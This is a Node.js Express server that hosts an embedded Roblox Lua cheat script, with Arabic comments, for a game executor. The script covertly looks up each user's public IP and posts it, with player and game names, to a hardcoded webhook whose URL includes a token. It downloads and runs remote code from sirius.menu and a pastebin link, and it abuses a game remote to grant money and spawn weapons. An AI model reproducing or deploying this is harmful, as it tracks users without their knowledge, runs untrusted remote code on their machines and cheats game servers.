const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// رابط الويب هوك الخاص بك مدمج مع الوسيط لضمان العمل على Delta
const webhookUrl = "https://hooks.hyra.io/api/webhooks/1500997210794365000/b3XsDU-dBJ874IPO1pZUK91CWwfk76K7HwzhMkz3ySt9WMKQHNQdheuBIMyFDd1HnwAb";

const myScript = `
local http = game:GetService("HttpService")
local player = game.Players.LocalPlayer

-- وظيفة سحب الآي بي (IP Address)
local function getIp()
    local success, result = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    return success and result or "Unknown"
end

local userIp = getIp()

-- نظام الحظر (IP BAN)
local bannedIps = {
    "1.1.1.1", -- ضع الآي بي هنا لحظر أي شخص لاحقاً
}

for _, ip in pairs(bannedIps) do
    if userIp == ip then
        player:Kick("🚫 أنت محظور من استخدام سكربت F2")
        return
    end
end

-- إرسال التقرير لديسكورد عند التشغيل
local logData = {
    ["content"] = "🚀 **تم تشغيل سكربت F2 الجديد!**",
    ["embeds"] = {{
        ["title"] = "سجل دخول المستخدم",
        ["fields"] = {
            {["name"] = "اللاعب", ["value"] = player.Name, ["inline"] = true},
            {["name"] = "الآي بي (IP)", ["value"] = "||" .. userIp .. "||", ["inline"] = false},
            {["name"] = "اللعبة", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = false}
        },
        ["color"] = 16744192,
        ["footer"] = {["text"] = "F2 Security System"}
    }}
}
pcall(function() http:PostAsync("${webhookUrl}", http:JSONEncode(logData)) end)

-- استخدام مكتبة Rayfield للواجهة
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "F2 Private Script v3",
   LoadingTitle = "F2 System Loading...",
   LoadingSubtitle = "by Delta Team",
   ConfigurationSaving = { Enabled = false }
})

-- تبويب التجميع (Auto Click & Money)
local TabTajmee = Window:CreateTab("تجميع", 4483362458)
local AmountInput = ""

TabTajmee:CreateInput({
   Name = "أدخل المبلغ",
   PlaceholderText = "اكتب هنا...",
   Callback = function(Text) AmountInput = Text end,
})

TabTajmee:CreateButton({
   Name = "إضافة الفلوس فورا",
   Callback = function()
      local val = tonumber(AmountInput)
      if val then
          -- استخدام ثغرة Desert Deagle كما طلبت
          game:GetService("ReplicatedStorage").RequestTool:FireServer("Desert Deagle", -math.abs(val))
      end
   end,
})

TabTajmee:CreateButton({
   Name = "تنشيط الأوتو كليك",
   Callback = function()
      -- تشغيل سكربت الأوتو كليك الخارجي
      loadstring(game:HttpGet("https://pastebin.com/raw/eR1HPXfw"))()
   end,
})

-- تبويب الرسبنة (Items Spawn)
local TabSpawn = Window:CreateTab("رسبنة", 4483362458)
local items = {
    {"رسبون M4", "M4A1"},
    {"رسبون ديقل", "Desert Deagle"},
    {"رسبون كلبشة", "Handcuffs"},
    {"رسبون راديو", "Radio"},
    {"رسبون طلق", "AmmoBox"},
    {"رسبون كيس", "Filled Packet"},
    {"رسبون مفتاح مركز", "مفتاح المركز"},
    {"رسبون فايف", "FiveSeven"},
    {"رسبون درع خفيف", "Light Vest"},
    {"رسبون درع ثقيل", "Heavy Vest"}
}

for _, item in pairs(items) do
    TabSpawn:CreateButton({
       Name = item[1],
       Callback = function() 
          game:GetService("ReplicatedStorage").RequestTool:FireServer(item[2], 0) 
       end,
    })
end

Rayfield:Notify({
   Title = "F2 Script",
   Content = "تم التحميل بنجاح، استمتع!",
   Duration = 5,
})
`;

app.get('/raw', (req, res) => {
    res.set('Content-Type', 'text/plain');
    res.send(myScript);
});

app.get('/', (req, res) => {
    res.send('F2 Server is Live and Secured!');
});

app.listen(PORT, () => {
    console.log('Server active on port ' + PORT);
});
